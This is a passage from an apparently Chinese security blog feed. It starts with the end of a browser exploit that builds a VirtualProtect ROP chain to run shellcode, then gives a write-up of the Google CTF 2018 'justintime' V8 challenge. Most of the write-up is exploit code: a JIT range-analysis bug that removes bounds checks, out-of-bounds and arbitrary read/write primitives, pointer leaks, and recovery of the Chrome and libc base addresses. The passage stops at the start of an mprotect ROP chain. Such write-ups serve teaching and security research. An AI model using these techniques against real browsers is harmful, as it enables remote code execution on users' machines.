class="number">0x1000</span>;</span></span><br><span class="line"><span class="actionscript"><span class="comment">// alert("[+] the sc_offset is at 0x" + sc_offset.toString(16));</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="keyword">let</span> sc_addr = scratch_addr + <span class="keyword">new</span> Int64(<span class="string">"0x"</span> + sc_offset.toString(<span class="number">16</span>)).asDouble();</span></span><br><span class="line"><span class="actionscript"><span class="comment">// alert("[+] the sc_addr is at " + Int64.fromDouble(sc_addr).toString());</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">scratch_u8.set(shellcode, <span class="built_in">Number</span>(sc_offset));</span></span><br><span class="line"></span><br><span class="line">scratch_u64.fill(gadget, 0, 100);</span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="keyword">let</span> fake_vtab = scratch_addr;</span></span><br><span class="line"><span class="actionscript"><span class="comment">// alert("[+] the fake_vtab is at " + Int64.fromDouble(fake_vtab).toString());</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="keyword">let</span> fake_stack = scratch_addr + <span class="keyword">new</span> Int64(<span class="number">0x10000</span>).asDouble();</span></span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="keyword">let</span> stack = [</span></span><br><span class="line">    pop_rcx_ret,</span><br><span class="line">    sc_addr,</span><br><span class="line">    pop_rdx_ret,</span><br><span class="line"><span class="actionscript">    <span class="keyword">new</span> Int64(<span class="number">0x1000</span>).asDouble(),</span></span><br><span class="line">    pop_r8_ret,</span><br><span class="line"><span class="actionscript">    <span class="keyword">new</span> Int64(<span class="number">0x40</span>).asDouble(),</span></span><br><span class="line">    pop_r9_ret,</span><br><span class="line">    scratch_addr,</span><br><span class="line"><span class="actionscript">    virtaulprotect_addr, <span class="comment">// VirtualProtect</span></span></span><br><span class="line">    sc_addr,</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; stack.length; ++i) &#123;</span></span><br><span class="line">    scratch_u64[0x10000/8 + i] = stack[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="actionscript">writePtr(offset, el_addr + <span class="keyword">new</span> Int64(<span class="number">0x10</span>).asDouble(), fake_stack); <span class="comment">// RSP</span></span></span><br><span class="line"><span class="actionscript">writePtr(offset, el_addr + <span class="keyword">new</span> Int64(<span class="number">0x50</span>).asDouble(), pop_rcx_ret + <span class="keyword">new</span> Int64(<span class="number">0x1</span>).asDouble()); <span class="comment">// RIP = ret</span></span></span><br><span class="line"><span class="actionscript">writePtr(offset, el_addr + <span class="keyword">new</span> Int64(<span class="number">0x58</span>).asDouble(), <span class="number">0</span>);</span></span><br><span class="line"><span class="actionscript">writePtr(offset, el_addr + <span class="keyword">new</span> Int64(<span class="number">0x60</span>).asDouble(), <span class="number">0</span>);</span></span><br><span class="line"><span class="actionscript">writePtr(offset, el_addr + <span class="keyword">new</span> Int64(<span class="number">0x68</span>).asDouble(), <span class="number">0</span>);</span></span><br><span class="line">writePtr(offset, el_addr, fake_vtab);</span><br><span class="line"></span><br><span class="line"><span class="actionscript"><span class="comment">// alert("ok");</span></span></span><br><span class="line"><span class="actionscript">div.dispatchEvent(<span class="keyword">new</span> Event(<span class="string">'click'</span>));</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;参考链接&quot;&gt;&lt;a href=&quot;#参考链接&quot; class=&quot;headerlink&quot; title=&quot;参考链接&quot;&gt;&lt;/a&gt;参考链接&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://bugs.chromium.org/p/chromium/issues/det
      
    
    </summary>
    
    
      <category term="浏览器" scheme="http://eternalsakura13.com/categories/%E6%B5%8F%E8%A7%88%E5%99%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>Google CTF justintime exploit</title>
    <link href="http://eternalsakura13.com/2018/11/19/justintime/"/>
    <id>http://eternalsakura13.com/2018/11/19/justintime/</id>
    <published>2018-11-19T03:53:18.816Z</published>
    <updated>2018-11-19T11:40:57.566Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://github.com/google/google-ctf/tree/master/2018/finals/pwn-just-in-time/" target="_blank" rel="noopener">https://github.com/google/google-ctf/tree/master/2018/finals/pwn-just-in-time/</a><br>Thanks for Stephen, I learned a lot from his amazing challenge.</p><h2 id="Setup"><a href="#Setup" class="headerlink" title="Setup"></a>Setup</h2><p>I am lazy, so I use Xcode to compile V8 version 7.2.0 (candidate)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/v8/v8</span><br><span class="line">git reset 7.2.0 --hard</span><br><span class="line">gclient sync</span><br><span class="line">gn gen out/gn --ide=<span class="string">"xcode"</span></span><br><span class="line">patch -p1 &lt; ./addition-reducer.patch</span><br><span class="line"><span class="built_in">cd</span> out/gn</span><br><span class="line">open all.xcworkspace/</span><br><span class="line">Compile</span><br></pre></td></tr></table></figure><h2 id="Some-features"><a href="#Some-features" class="headerlink" title="Some features"></a>Some features</h2><h3 id="Max-Safe-Integer-Range-of-Doubles"><a href="#Max-Safe-Integer-Range-of-Doubles" class="headerlink" title="Max Safe Integer Range of Doubles"></a>Max Safe Integer Range of Doubles</h3><p><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Number/MAX_SAFE_INTEGER" target="_blank" rel="noopener">https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Number/MAX_SAFE_INTEGER</a></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Number</span>.MAX_SAFE_INTEGER = <span class="number">2</span>^<span class="number">53</span> - <span class="number">1</span></span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"><span class="keyword">var</span> x = <span class="built_in">Number</span>.MAX_SAFE_INTEGER + <span class="number">1</span>;<span class="comment">//x = 9007199254740992</span></span><br><span class="line">x += <span class="number">1</span>;<span class="comment">//x = 9007199254740992</span></span><br><span class="line">x += <span class="number">1</span>;<span class="comment">//x = 9007199254740992</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> y = <span class="built_in">Number</span>.MAX_SAFE_INTEGER + <span class="number">1</span>;<span class="comment">//y = 9007199254740992</span></span><br><span class="line">y += <span class="number">2</span>;<span class="comment">//y = 9007199254740994</span></span><br></pre></td></tr></table></figure><h2 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">doit</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> a = [<span class="number">1.1</span>, <span class="number">1.2</span>, <span class="number">1.3</span>, <span class="number">1.4</span>, <span class="number">1.5</span>, <span class="number">1.6</span>];</span><br><span class="line">    <span class="keyword">let</span> x = doit ? <span class="number">9007199254740992</span> : <span class="number">9007199254740991</span><span class="number">-2</span>;</span><br><span class="line">    x += <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// #29:NumberConstant[1]()  [Type: Range(1, 1)]</span></span><br><span class="line">    <span class="comment">// #30:SpeculativeNumberAdd[Number](#25:Phi, #29:NumberConstant, #26:Checkpoint, #23:Merge)  [Type: Range(9007199254740990, 9007199254740992)]</span></span><br><span class="line">    x += <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// #29:NumberConstant[1]()  [Type: Range(1, 1)]</span></span><br><span class="line">    <span class="comment">// #31:SpeculativeNumberAdd[Number](#30:SpeculativeNumberAdd, #29:NumberConstant, #30:SpeculativeNumberAdd, #23:Merge)  [Type: Range(9007199254740991, 9007199254740992)]</span></span><br><span class="line">    x -= <span class="number">9007199254740991</span>;<span class="comment">//解释:range(0,1);编译:(0,3);</span></span><br><span class="line">    <span class="comment">// #32:NumberConstant[9.0072e+15]()  [Type: Range(9007199254740991, 9007199254740991)]</span></span><br><span class="line">    <span class="comment">// #33:SpeculativeNumberSubtract[Number](#31:SpeculativeNumberAdd, #32:NumberConstant, #31:SpeculativeNumberAdd, #23:Merge)  [Type: Range(0, 1)]</span></span><br><span class="line">    x *= <span class="number">3</span>;<span class="comment">//解释:(0,3);编译:(0,9);</span></span><br><span class="line">    <span class="comment">// #34:NumberConstant[3]()  [Type: Range(3, 3)]</span></span><br><span class="line">    <span class="comment">// #35:SpeculativeNumberMultiply[Number](#33:SpeculativeNumberSubtract, #34:NumberConstant, #33:SpeculativeNumberSubtract, #23:Merge)  [Type: Range(0, 3)]</span></span><br><span class="line">    x += <span class="number">2</span>;<span class="comment">//解释:(2,5);编译:(2,11);</span></span><br><span class="line">    <span class="comment">// #36:NumberConstant[2]()  [Type: Range(2, 2)]</span></span><br><span class="line">    <span class="comment">// #37:SpeculativeNumberAdd[Number](#35:SpeculativeNumberMultiply, #36:NumberConstant, #35:SpeculativeNumberMultiply, #23:Merge)  [Type: Range(2, 5)]</span></span><br><span class="line">    a[x] = <span class="number">2.1729236899484e-311</span>; <span class="comment">// (1024).smi2f()</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++)&#123;</span><br><span class="line">  foo(<span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Run PoC until <code>remove checkbounds</code> is called:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">index_type.Print();</span><br><span class="line">-&gt;Range(<span class="number">2</span>, <span class="number">5</span>)</span><br><span class="line">length_type.Print();</span><br><span class="line">-&gt;Range(<span class="number">6</span>, <span class="number">6</span>)</span><br><span class="line">...</span><br><span class="line"><span class="keyword">if</span> (index_type.IsNone() || length_type.IsNone() ||</span><br><span class="line">                (index_type.Min() &gt;= <span class="number">0.0</span> &amp;&amp;</span><br><span class="line">                 index_type.Max() &lt; length_type.Min())) </span><br><span class="line">Condition is satisfied，so it removes CheckBounds</span><br></pre></td></tr></table></figure><p>All in all, the result of <code>range analyzes</code> is different from the result of <code>optimized range</code>. After <code>simplified lower</code> removes boundary check, we can do OOB read/write.</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><h3 id="Partial-OOB-read-write"><a href="#Partial-OOB-read-write" class="headerlink" title="Partial OOB read/write"></a>Partial OOB read/write</h3><p>We place <code>array a</code> next to <code>array b</code>, use OOB write from <code>a</code> to change the length of <code>array b</code>. Now, the length of <code>b</code> is <code>0x400</code>.</p><p>And we can OOB via <code>array b</code>:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">doit</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> a = [<span class="number">1.1</span>, <span class="number">1.2</span>, <span class="number">1.3</span>, <span class="number">1.4</span>, <span class="number">1.5</span>, <span class="number">1.6</span>];</span><br><span class="line">  <span class="keyword">let</span> b = [<span class="number">1.1</span>, <span class="number">1.2</span>, <span class="number">1.3</span>, <span class="number">1.4</span>, <span class="number">1.5</span>, <span class="number">1.6</span>];</span><br><span class="line">  ...</span><br><span class="line">  ...</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++) &#123;<span class="comment">//-&gt;trigger JIT</span></span><br><span class="line">    foo(<span class="literal">true</span>);</span><br><span class="line">    g2[<span class="number">100</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (g2[<span class="number">12</span>] != <span class="literal">undefined</span>) <span class="keyword">break</span>;<span class="comment">//-&gt;Confirm the boundary is overwritten </span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (g2[<span class="number">12</span>] == <span class="literal">undefined</span>) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="string">'g2[12] == undefined'</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-11-14-114549.png" alt=""></p><h3 id="From-Partial-OOB-R-W-to-Arbitrary-R-W-Primitive"><a href="#From-Partial-OOB-R-W-to-Arbitrary-R-W-Primitive" class="headerlink" title="From Partial OOB R/W to Arbitrary R/W Primitive"></a>From Partial OOB R/W to Arbitrary R/W Primitive</h3><p>Add a <code>Float64Array</code>. We can <strong>edit</strong> the <code>backing store</code> of <code>ArrayBuffer</code> to arbitrary R/W primitive.</p><p>We won’t create Float64Array unless the memory is in <code>g2[ab_off]</code>:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">doit</span>) </span>&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">let</span> b = [<span class="number">1.1</span>, <span class="number">1.2</span>, <span class="number">1.3</span>, <span class="number">1.4</span>, <span class="number">1.5</span>, <span class="number">1.6</span>];</span><br><span class="line">  ...</span><br><span class="line">  g2 = b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> ab_off = <span class="number">26</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  ...</span><br><span class="line">  g4 = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(<span class="number">7</span>);<span class="comment">//set up a Float64Array</span></span><br><span class="line">  <span class="keyword">if</span> (g2[ab_off+<span class="number">5</span>].f2smi() != <span class="number">0x38n</span> || g2[ab_off+<span class="number">6</span>].f2smi() != <span class="number">0x7n</span>) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="string">'array buffer not at expected location'</span>;</span><br><span class="line">    <span class="comment">//byte_length is 0x38, length is 0x7</span></span><br><span class="line">    <span class="comment">//so, Float64Array is in correct location now</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-11-14-114922.png" alt=""></p><p>Find the address of array buffer backing store:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> ab_backing_store_off = ab_off + <span class="number">0x15</span>;</span><br><span class="line">...</span><br><span class="line">g4[<span class="number">0</span>] = <span class="number">5.5</span>;</span><br><span class="line"><span class="keyword">if</span> (g2[ab_backing_store_off] != g4[<span class="number">0</span>]) &#123;</span><br><span class="line">  <span class="keyword">throw</span> <span class="string">'array buffer backing store not at expected location'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>I wonder which address records the backing store. After checking for a little while, it’s my first time to see <strong>new Float64Array() directly</strong>. Normally, it should be：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> ab = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">20</span>);</span><br><span class="line"><span class="keyword">var</span> f64 = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(ab);</span><br></pre></td></tr></table></figure><p>Finding the elements of <code>Float64Array</code>.<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-11-14-113544.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-11-14-113454.png" alt=""></p><p>Add <code>+0x10</code> to the address, we can get <code>backing store</code>.<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-11-14-115204.png" alt=""></p><p>The address of elements is <code>0x0000093f18ac9ed</code>. In <code>0x0000093f18ac9ed+0x20</code>, we have the first element <code>-5.5</code>.(<code>0x4016000000000000</code> in the picture):<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-11-14-113654.png" alt=""></p><p>When we edit backing store to get arbitrary r/w primitive, assume <code>addr</code> as the target address, change the value of backing store to <code>addr-0x20</code>，then we can leak content in this address.</p><h3 id="User-mode-object-leak-primitive"><a href="#User-mode-object-leak-primitive" class="headerlink" title="User mode object leak primitive"></a>User mode object leak primitive</h3><p>Appending an object to <code>g3</code>. Then, double array <code>g2</code> can leak that object, resulting type confusion. The leaked content is <code>float</code>. <code>f2i</code> is able to convert it to integer:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">leak_ptr</span>(<span class="params">o</span>) </span>&#123;</span><br><span class="line">  g3[<span class="number">0</span>] = o;</span><br><span class="line">  <span class="keyword">let</span> ptr = g2[g3_off];</span><br><span class="line">  g3[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> ptr.f2i();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Here is the output：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> Array_addr = leak_ptr(<span class="built_in">Array</span>);</span><br><span class="line">print(<span class="string">'Array_addr: '</span> + Array_addr.hex());</span><br><span class="line">...</span><br><span class="line">Array_addr: <span class="number">0x93f11611259</span></span><br></pre></td></tr></table></figure><h3 id="Arbitrary-Address-R-W-Primitive"><a href="#Arbitrary-Address-R-W-Primitive" class="headerlink" title="Arbitrary Address R/W Primitive"></a>Arbitrary Address R/W Primitive</h3><p>Script:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">readq</span>(<span class="params">addr</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> old = g2[ab_off+<span class="number">2</span>];</span><br><span class="line">  g2[ab_backing_store_off<span class="number">-2</span>] = (addr<span class="number">-0x20n</span>|<span class="number">1n</span>).i2f();</span><br><span class="line">  <span class="keyword">let</span> q = g4[<span class="number">0</span>];</span><br><span class="line">  g2[ab_off+<span class="number">2</span>] = old;</span><br><span class="line">  <span class="keyword">return</span> q.f2i();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">writeq</span>(<span class="params">addr, val</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> old = g2[ab_off+<span class="number">2</span>];</span><br><span class="line">  g2[ab_backing_store_off<span class="number">-2</span>] = (addr<span class="number">-0x20n</span>|<span class="number">1n</span>).i2f();</span><br><span class="line">  g4[<span class="number">0</span>] = val.i2f();</span><br><span class="line">  g2[ab_off+<span class="number">2</span>] = old;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Let’s have a look on <code>readq</code></p><p>We can get the original value of <code>backing store</code> form <code>g2[ab_off+2]</code>. Change it to the target address. Pay attention to the last <code>1</code>. This is a mechanism called <code>Tagged Value</code>. Only when 1 is in the last of the address can it be a valid pointer of <code>HeapObject</code>.</p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-11-14-113544.png" alt=""></p><p>Edit it to the content we want to read. E.g, leak the code:<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-11-14-120746.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-11-14-120730.png" alt=""></p><p>I explained why we should <code>- 20</code> previously, so skip this part here:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">g2[ab_backing_store_off<span class="number">-2</span>] = (addr<span class="number">-0x20n</span>|<span class="number">1n</span>).i2f();</span><br></pre></td></tr></table></figure><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-11-14-121339.png" alt=""></p><p>Now the <code>backing store</code> is changed to <code>addr-0x20</code><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-11-14-121639.png" alt=""></p><p>We can leak code address <code>0x000001db14a8c821</code> from <code>0x0000093f11611288</code> now.</p><p>Output:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> Array_addr = leak_ptr(<span class="built_in">Array</span>);</span><br><span class="line">print(<span class="string">'Array_addr: '</span> + Array_addr.hex());</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> Array_code_addr = readq(Array_addr + <span class="number">6n</span>*<span class="number">8n</span>);</span><br><span class="line">print(<span class="string">'Array_code_addr: '</span> + Array_code_addr.hex());</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">Array_code_addr: <span class="number">0x1db14a8c821</span></span><br></pre></td></tr></table></figure><p><code>writeq</code> is the same as <code>readq</code>.</p><h3 id="Security-Feature"><a href="#Security-Feature" class="headerlink" title="Security Feature"></a>Security Feature</h3><p>Earlier than <code>version 6.7</code>, the function code is writable. Therefore, we can write shellcode to functions and call the function to execute.</p><p>Later, however, the code is not writable and we need to chain ROP.(<a href="https://github.com/v8/v8/commit/f7aa8ea00bbf200e9050a22ec84fab4f323849a7" target="_blank" rel="noopener">https://github.com/v8/v8/commit/f7aa8ea00bbf200e9050a22ec84fab4f323849a7</a>)</p><h3 id="leak-ArrayConstructor"><a href="#leak-ArrayConstructor" class="headerlink" title="leak ArrayConstructor"></a>leak ArrayConstructor</h3><p>Now, leak the address of <code>Array</code>, Then find the address of Array’s code. In the final, calculate the address of ArrayConstructor:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> Array_addr = leak_ptr(<span class="built_in">Array</span>);</span><br><span class="line">print(<span class="string">'Array_addr: '</span> + Array_addr.hex());</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> Array_code_addr = readq(Array_addr + <span class="number">6n</span>*<span class="number">8n</span>);</span><br><span class="line">print(<span class="string">'Array_code_addr: '</span> + Array_code_addr.hex());</span><br><span class="line"><span class="comment">// Builtins_ArrayConstructor</span></span><br><span class="line"><span class="keyword">let</span> builtin_val = readq(Array_code_addr+<span class="number">8n</span>*<span class="number">8n</span>);</span><br><span class="line"><span class="keyword">let</span> Array_builtin_addr = builtin_val &gt;&gt; <span class="number">16n</span>;</span><br><span class="line">print(<span class="string">'Array_builtin_addr: '</span> + Array_builtin_addr.hex());</span><br></pre></td></tr></table></figure><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-11-14-122341.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-11-14-122454.png" alt=""></p><h3 id="Reverse-Chrome-and-libc"><a href="#Reverse-Chrome-and-libc" class="headerlink" title="Reverse Chrome and libc"></a>Reverse Chrome and libc</h3><p>We can leak the address of <code>ArrayConstructor</code><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-11-16-085233.jpg" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-11-16-085258.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-11-16-085307.jpg" alt=""></p><p>It’s mapped to the memory of chrome binary.<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-11-16-085402.png" alt=""></p><p>Use IDA to reverse. Seek the offset of <code>ArrayConstructor</code> in chrome binary.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; hex(0x55b677f727c0-0x55b673f16000)</span><br><span class="line">&#39;0x405c7c0&#39;</span><br></pre></td></tr></table></figure><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-11-16-085706.png" alt=""></p><p><code>chrome binary base address</code>=<code>ArrayConstructor</code>-<code>0x405c7c0</code>. Let’s store the result in <code>bin_base</code>：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> bin_base = Array_builtin_addr - <span class="number">0x405c7c0n</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">`bin base: <span class="subst">$&#123;bin_base.hex()&#125;</span>`</span>);</span><br></pre></td></tr></table></figure><p>Find <code>got table</code>. <code>cxa_finalize</code> is a libc function，there is a <code>got</code> in chrome pointing to it, the offset to the pointer is <code>0x8DDBDE8</code>.</p><p>Then leak <code>cxa_finalize</code>:<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-11-16-085836.png" alt=""></p><p>Reverse the libc.so, use <code>cxa_finalize_got</code>-<code>0x43520</code> to get the <code>base address</code> of libc:<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-11-16-090345.png" alt=""></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> cxa_finalize_got = bin_base + <span class="number">0x8ddbde8n</span>;</span><br><span class="line"><span class="keyword">let</span> libc_base = readq(cxa_finalize_got) - <span class="number">0x43520n</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'libc base: '</span> + libc_base.hex());</span><br></pre></td></tr></table></figure><p>Find <code>environ</code> to leak stack address:<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-11-16-090537.png" alt=""></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> environ = libc_base+<span class="number">0x3ee098n</span>;</span><br><span class="line"><span class="keyword">let</span> stack_ptr = readq(environ);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">`stack: <span class="subst">$&#123;stack_ptr.hex()&#125;</span>`</span>);</span><br></pre></td></tr></table></figure><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-11-16-090700.jpg" alt=""></p><h3 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h3><p>This section is easy, we use <code>mprotect</code> to change the permission of memory and execute shellcode:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 